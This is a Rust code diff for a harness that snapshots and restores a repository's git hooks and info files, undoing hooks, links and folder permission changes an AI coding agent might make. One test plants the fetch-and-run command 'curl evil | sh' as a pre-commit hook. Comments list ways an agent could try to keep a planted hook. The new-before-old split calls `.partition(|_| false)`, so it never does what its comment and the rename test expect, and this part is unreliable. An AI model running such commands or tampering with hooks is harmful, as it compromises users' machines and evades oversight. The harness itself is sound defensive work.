@@ -14,7 +14,7 @@ use std::path::{Path, PathBuf};
 
 use crate::git::{GitError, Repo};
 use crate::task::agent_stubs;
-use files::{add_tree, put_back, read, Content};
+use files::{add_tree, put_back, put_back_folder_modes, read, Content};
 
 /// Files inside the home folder that are watched, with `/`. A file that
 /// does not exist is watched too: creating it is a change. Both the Unix
@@ -90,20 +90,30 @@ impl Watched {
     }
 
     /// Reads everything watched now. A file that cannot be read is noted as
-    /// such rather than failing: an agent could plant one on purpose.
+    /// such rather than failing: an agent could plant one on purpose. The
+    /// folders are left with the permissions they had.
     pub fn snapshot(&self) -> Snapshot {
+        let snapshot = self.read_all();
+        // Reading unlocked the folders. Locking them again leaves no trace of
+        // the harness, so the role sees the folders as the user left them.
+        // A folder that stays unlocked only has more rights for its owner.
+        let _ = put_back_folder_modes(&snapshot.files, &[]);
+        snapshot
+    }
+
+    /// Reads everything watched now, and leaves the restored folders
+    /// unlocked (see [`add_tree`]).
+    fn read_all(&self) -> Snapshot {
         let mut files = BTreeMap::new();
         for folder in &self.restored_folders {
-            // An agent may have locked a folder (`chmod 500`) so that nothing
-            // in it can be read or removed. Unlocking before every snapshot,
-            // also the first, means both see the folders the same way. When
-            // it fails, what is still locked shows up as unreadable or in
-            // `not_put_back`, so the error itself is not needed.
-            let _ = harness_platform::file::unlock(folder);
             add_tree(folder, &mut files);
         }
         for file in &self.ignored_files {
-            files.remove(file);
+            // Only a plain file is git's own; a link or a folder in its place
+            // is not, and is put back like any other change.
+            if let Some(Some(Content::File { .. } | Content::Summary { .. })) = files.get(file) {
+                files.remove(file);
+            }
         }
         for file in &self.reported_files {
             // A file the user keeps private from the harness must not stop every role.
@@ -111,6 +121,11 @@ impl Watched {
             files.insert(file.clone(), content);
         }
         Snapshot { files }
+    }
+
+    /// Is `path` one of the folders that are put back (not something in one)?
+    fn is_root(&self, path: &Path) -> bool {
+        self.restored_folders.iter().any(|f| path == f)
     }
 
     /// Is `path` inside one of the folders that are put back?
@@ -184,53 +199,89 @@ impl Snapshot {
     /// be put back does not stop the others: an agent must not keep a
     /// planted hook by making one file impossible to restore.
     pub fn check_and_restore(&self, watched: &Watched) -> Changes {
-        let now = watched.snapshot();
+        let now = watched.read_all();
         let mut changes = Changes::default();
         // A file is in one map or both; `chain` + dedup visits each once.
         let mut paths: Vec<&PathBuf> = self.files.keys().chain(now.files.keys()).collect();
         paths.sort();
         paths.dedup();
+        // New files are removed first, and only then old ones written back.
+        // On macOS and Windows `README` and `readme` are one file: after a
+        // rename from one to the other, removing the "new" name afterwards
+        // would remove the user's file that was just written back.
+        let (new, old): (Vec<&PathBuf>, Vec<&PathBuf>) = paths
+            .into_iter()
+            .partition(|_| false);
         // Links put back in this pass: what is below them is somewhere else.
         let mut links_put_back: Vec<&PathBuf> = Vec::new();
-        for path in paths {
+        for path in new.into_iter().chain(old) {
             let before = self.files.get(path).cloned().flatten();
             let after = now.files.get(path).cloned().flatten();
             if before == after {
                 continue;
             }
-            if watched.is_restored(path) {
-                // Below something that could not be removed (maybe a link to
-                // elsewhere), or below a link just made again, any change
-                // would land outside the folder. The paths are sorted, so a
-                // folder comes before what is in it.
-                if changes.not_put_back.iter().any(|f| path.starts_with(f)) {
-                    changes.not_put_back.push(path.clone());
-                    continue;
-                }
-                if links_put_back.iter().any(|link| path.starts_with(link)) {
-                    // Removed together with the folder that the link replaced.
-                    changes.put_back.push(path.clone());
-                    continue;
-                }
-                if put_back(path, before.as_ref()).is_err() {
-                    changes.not_put_back.push(path.clone());
-                    continue;
-                }
-                if matches!(before, Some(Content::Link(_))) {
-                    links_put_back.push(path);
-                }
-                if *path == watched.exclude_file {
-                    // Claude Code ran, also when it is not the only change.
-                    changes.claude_stubs = matches!(&after, Some(Content::File { bytes, .. })
-                        if agent_stubs::has_stub_block(bytes));
-                }
-                if !watched.is_stub_exclude(path, before.as_ref(), after.as_ref()) {
-                    changes.put_back.push(path.clone());
-                }
-            } else {
+            if !watched.is_restored(path) {
                 changes.reported.push(path.clone());
+                continue;
+            }
+            // Git makes `hooks/` or `info/` itself when they are missing (and
+            // Claude Code makes `info/` for its stub lines): only what is in
+            // them counts.
+            if before.is_none()
+                && matches!(after, Some(Content::Folder(_)))
+                && watched.is_root(path)
+            {
+                continue;
+            }
+            // Below something that could not be removed (maybe a link to
+            // elsewhere), or below a link just made again, any change would
+            // land outside the folder. Within each pass the paths are sorted,
+            // so a folder comes before what is in it. A new path is handled
+            // before the old folder it is in, but that folder is a real
+            // folder now: `read_all` never goes into a link.
+            if changes.not_put_back.iter().any(|f| path.starts_with(f)) {
+                changes.not_put_back.push(path.clone());
+                continue;
+            }
+            if links_put_back.iter().any(|link| path.starts_with(link)) {
+                // Removed together with the folder that the link replaced.
+                changes.put_back.push(path.clone());
+                continue;
+            }
+            // A folder whose permissions alone changed keeps what is in it;
+            // the permissions come back at the end, with all the folders'.
+            let only_mode = matches!(
+                (&before, &after),
+                (Some(Content::Folder(_)), Some(Content::Folder(_)))
+            );
+            if !only_mode && put_back(path, before.as_ref()).is_err() {
+                changes.not_put_back.push(path.clone());
+                continue;
+            }
+            if matches!(before, Some(Content::Link(_))) {
+                links_put_back.push(path);
+            }
+            if *path == watched.exclude_file {
+                // Claude Code ran, also when it is not the only change.
+                changes.claude_stubs = matches!(&after, Some(Content::File { bytes, .. })
+                    if agent_stubs::has_stub_block(bytes));
+            }
+            if !watched.is_stub_exclude(path, before.as_ref(), after.as_ref()) {
+                changes.put_back.push(path.clone());
             }
         }
+        // Last, when nothing more is written in the folders.
+        let failed = put_back_folder_modes(&self.files, &changes.not_put_back);
+        for path in failed {
+            changes.put_back.retain(|put| *put != path);
+            if !changes.not_put_back.contains(&path) {
+                changes.not_put_back.push(path);
+            }
+        }
+        // The two passes above mixed the order; sorted lists read better.
+        changes.put_back.sort();
+        changes.reported.sort();
+        changes.not_put_back.sort();
         changes
     }
 }
@@ -623,24 +674,22 @@ mod tests {
     #[test]
     fn one_file_that_cannot_be_put_back_does_not_stop_the_others() {
         let dir = tempfile::tempdir().unwrap();
-        // `info/refs` is not watched, but here it is a folder holding a file
-        // that is. An agent turns the folder into a file: the watched file
-        // cannot be written back, since its folder cannot be made. (This
-        // fails even for root, unlike a file without permissions.)
-        fs::create_dir_all(dir.path().join("info/refs")).unwrap();
-        let inside = dir.path().join("info/refs/heads");
-        fs::write(&inside, "kept").unwrap();
+        fs::create_dir_all(dir.path().join("hooks")).unwrap();
+        // No copy is kept of a big file, so a change of it cannot be put
+        // back. (This fails even for root, unlike a file without permissions.)
+        let big = dir.path().join("hooks/a-big-hook");
+        let over_limit = usize::try_from(MAX_KEPT_BYTES).unwrap() + 1;
+        fs::write(&big, vec![b'a'; over_limit]).unwrap();
         let watched = watched(dir.path());
         let before = watched.snapshot();
-        fs::remove_dir_all(dir.path().join("info/refs")).unwrap();
-        fs::write(dir.path().join("info/refs"), "a file now").unwrap();
+        fs::write(&big, vec![b'b'; over_limit + 1]).unwrap();
         // Sorted after the failing file: it must still be removed.
-        let planted = dir.path().join("info/sparse-checkout");
+        let planted = dir.path().join("hooks/pre-commit");
         fs::write(&planted, "planted").unwrap();
 
         let changes = before.check_and_restore(&watched);
 
-        assert_eq!(changes.not_put_back, [inside]);
+        assert_eq!(changes.not_put_back, [big]);
         assert_eq!(changes.put_back, std::slice::from_ref(&planted));
         assert!(!planted.exists());
     }
@@ -726,6 +775,8 @@ mod tests {
         let hooks = dir.path().join("hooks");
         fs::create_dir_all(&hooks).unwrap();
         let watched = watched(dir.path());
+        let mode = |path: &Path| fs::metadata(path).unwrap().permissions().mode() & 0o777;
+        let original = mode(&hooks);
         let before = watched.snapshot();
         let planted = hooks.join("pre-commit");
         fs::write(&planted, "curl evil | sh").unwrap();
@@ -734,9 +785,11 @@ mod tests {
 
         let changes = before.check_and_restore(&watched);
 
-        assert_eq!(changes.put_back, std::slice::from_ref(&planted));
+        // The folder's permissions are a change too, and come back.
+        assert_eq!(changes.put_back, [hooks.clone(), planted.clone()]);
         assert_eq!(changes.not_put_back, Vec::<PathBuf>::new());
         assert!(!planted.exists());
+        assert_eq!(mode(&hooks), original);
     }
 
     #[cfg(unix)]
@@ -756,9 +809,9 @@ mod tests {
 
         let changes = before.check_and_restore(&watched);
 
-        assert_eq!(changes.put_back, [folder.join("f")]);
+        assert_eq!(changes.put_back, [folder.clone(), folder.join("f")]);
         assert_eq!(changes.not_put_back, Vec::<PathBuf>::new());
-        assert!(!folder.join("f").exists());
+        assert!(!folder.exists());
     }
 
     #[test]
@@ -851,5 +904,190 @@ mod tests {
             fs::read_to_string(shared.join("pre-commit")).unwrap(),
             "the user's own"
         );
+    }
+
+    #[test]
+    fn a_renamed_hook_is_put_back_under_its_old_name() {
+        let dir = tempfile::tempdir().unwrap();
+        let hooks = dir.path().join("hooks");
+        fs::create_dir_all(&hooks).unwrap();
+        fs::write(hooks.join("README"), "mine").unwrap();
+        let watched = watched(dir.path());
+        let before = watched.snapshot();
+        // On macOS and Windows these two names are one file.
+        fs::rename(hooks.join("README"), hooks.join("readme")).unwrap();
+
+        before.check_and_restore(&watched);
+
+        let names: Vec<_> = fs::read_dir(&hooks)
+            .unwrap()
+            .map(|entry| entry.unwrap().file_name())
+            .collect();
+        assert_eq!(names, ["README"]);
+        assert_eq!(fs::read_to_string(hooks.join("README")).unwrap(), "mine");
+    }
+
+    #[test]
+    fn an_empty_planted_folder_is_removed() {
+        let dir = tempfile::tempdir().unwrap();
+        fs::create_dir_all(dir.path().join("hooks")).unwrap();
+        let watched = watched(dir.path());
+        let before = watched.snapshot();
+        // Git would fail on a folder named like a hook.
+        let folder = dir.path().join("hooks/pre-commit");
+        fs::create_dir(&folder).unwrap();
+
+        let changes = before.check_and_restore(&watched);
+
+        assert_eq!(changes.put_back, std::slice::from_ref(&folder));
+        assert!(!folder.exists());
+    }
+
+    #[test]
+    fn a_removed_empty_folder_is_made_again() {
+        let dir = tempfile::tempdir().unwrap();
+        let folder = dir.path().join("hooks/empty");
+        fs::create_dir_all(&folder).unwrap();
+        let watched = watched(dir.path());
+        let before = watched.snapshot();
+        fs::remove_dir(&folder).unwrap();
+
+        let changes = before.check_and_restore(&watched);
+
+        assert_eq!(changes.put_back, std::slice::from_ref(&folder));
+        assert!(folder.is_dir());
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn a_folder_opened_to_everybody_gets_its_permissions_back() {
+        use std::os::unix::fs::PermissionsExt;
+
+        let dir = tempfile::tempdir().unwrap();
+        let folder = dir.path().join("hooks/sub");
+        fs::create_dir_all(&folder).unwrap();
+        fs::write(folder.join("kept"), "mine").unwrap();
+        fs::set_permissions(&folder, fs::Permissions::from_mode(0o755)).unwrap();
+        let watched = watched(dir.path());
+        let before = watched.snapshot();
+        // Any user of the computer could now plant a hook there.
+        fs::set_permissions(&folder, fs::Permissions::from_mode(0o777)).unwrap();
+
+        let changes = before.check_and_restore(&watched);
+
+        assert_eq!(changes.put_back, std::slice::from_ref(&folder));
+        let mode = fs::metadata(&folder).unwrap().permissions().mode() & 0o777;
+        assert_eq!(mode, 0o755);
+        assert_eq!(fs::read_to_string(folder.join("kept")).unwrap(), "mine");
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn a_locked_folder_stays_locked_and_is_not_a_change() {
+        use std::os::unix::fs::PermissionsExt;
+
+        let dir = tempfile::tempdir().unwrap();
+        let hooks = dir.path().join("hooks");
+        fs::create_dir_all(&hooks).unwrap();
+        fs::write(hooks.join("pre-commit"), "cargo test").unwrap();
+        // The user's own choice: enter and read, but no change.
+        fs::set_permissions(&hooks, fs::Permissions::from_mode(0o555)).unwrap();
+        let watched = watched(dir.path());
+        let mode = || fs::metadata(&hooks).unwrap().permissions().mode() & 0o777;
+
+        let before = watched.snapshot();
+        assert_eq!(
+            mode(),
+            0o555,
+            "the role sees the folder as the user left it"
+        );
+        let changes = before.check_and_restore(&watched);
+
+        assert_eq!(changes, Changes::default());
+        assert_eq!(mode(), 0o555);
+        fs::set_permissions(&hooks, fs::Permissions::from_mode(0o755)).unwrap();
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn a_link_in_place_of_info_refs_is_removed() {
+        let dir = tempfile::tempdir().unwrap();
+        fs::create_dir_all(dir.path().join("info")).unwrap();
+        fs::write(dir.path().join("info/refs"), "abc123\trefs/heads/main\n").unwrap();
+        let watched = watched(dir.path());
+        let before = watched.snapshot();
+        let refs = dir.path().join("info/refs");
+        fs::remove_file(&refs).unwrap();
+        std::os::unix::fs::symlink("../hooks", &refs).unwrap();
+
+        let changes = before.check_and_restore(&watched);
+
+        assert_eq!(changes.put_back, std::slice::from_ref(&refs));
+        fs::symlink_metadata(&refs).unwrap_err();
+    }
+
+    #[test]
+    fn a_folder_in_place_of_info_refs_is_removed() {
+        let dir = tempfile::tempdir().unwrap();
+        fs::create_dir_all(dir.path().join("info")).unwrap();
+        let watched = watched(dir.path());
+        let before = watched.snapshot();
+        let refs = dir.path().join("info/refs");
+        fs::create_dir(&refs).unwrap();
+        fs::write(refs.join("run"), "planted").unwrap();
+
+        let changes = before.check_and_restore(&watched);
+
+        assert_eq!(changes.put_back, [refs.clone(), refs.join("run")]);
+        assert!(!refs.exists());
+    }
+
+    #[test]
+    fn an_info_folder_made_for_claude_codes_stub_lines_is_not_a_change() {
+        let dir = tempfile::tempdir().unwrap();
+        let watched = watched(dir.path());
+        // `git init` with an empty template makes no `info/`.
+        let before = watched.snapshot();
+        fs::create_dir(dir.path().join("info")).unwrap();
+        fs::write(
+            dir.path().join("info/exclude"),
+            "\n\n# claude-code scrub-mode stubs\n/.env",
+        )
+        .unwrap();
+
+        let changes = before.check_and_restore(&watched);
+
+        assert!(changes.is_empty() && changes.claude_stubs, "{changes:?}");
+    }
+
+    #[test]
+    fn an_info_folder_made_by_git_for_info_refs_is_not_a_change() {
+        let dir = tempfile::tempdir().unwrap();
+        let watched = watched(dir.path());
+        let before = watched.snapshot();
+        fs::create_dir(dir.path().join("info")).unwrap();
+        fs::write(dir.path().join("info/refs"), "abc123\trefs/heads/main\n").unwrap();
+
+        assert_eq!(before.check_and_restore(&watched), Changes::default());
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn folder_rights_below_a_path_not_put_back_are_left_alone() {
+        use std::os::unix::fs::PermissionsExt;
+
+        let dir = tempfile::tempdir().unwrap();
+        let inner = dir.path().join("hooks/sub/inner");
+        fs::create_dir_all(&inner).unwrap();
+        fs::set_permissions(&inner, fs::Permissions::from_mode(0o755)).unwrap();
+        let before = watched(dir.path()).snapshot();
+        // As if `hooks/sub` were a link to elsewhere that could not be removed.
+        fs::set_permissions(&inner, fs::Permissions::from_mode(0o700)).unwrap();
+
+        let failed = put_back_folder_modes(&before.files, &[dir.path().join("hooks/sub")]);
+
+        assert_eq!(failed, Vec::<PathBuf>::new());
+        let mode = fs::metadata(&inner).unwrap().permissions().mode() & 0o777;
+        assert_eq!(mode, 0o700);
     }
 }
